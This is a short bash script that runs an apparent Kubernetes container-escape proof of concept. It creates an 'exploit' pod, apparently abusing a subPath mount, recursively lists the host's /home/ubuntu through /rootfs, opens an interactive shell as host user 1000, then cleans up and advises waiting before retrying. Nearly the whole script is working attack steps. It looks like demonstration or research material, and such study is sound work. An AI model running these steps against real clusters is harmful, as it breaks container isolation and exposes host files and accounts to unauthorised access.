#!/bin/bash

echo "Create the pod..."
kubectl create -f exploit-pod-user-1000.yaml
echo "Pod created.  Sleeping a bit to allow them to come up"
sleep 5
echo "Execing into the container.  Listing the host's /home/ubuntu as user id 1000"
kubectl exec -it subpath -c exploit -- ls -alR /rootfs
echo "Execing into the container.  Run: cd /rootfs to be user id 1000 in the host's /home/ubuntu"
kubectl exec -it subpath -c exploit -- /bin/bash
echo "Cleaning up"
kubectl delete -f exploit-pod-user-1000.yaml
echo "Wait 45-60 seconds before trying again"
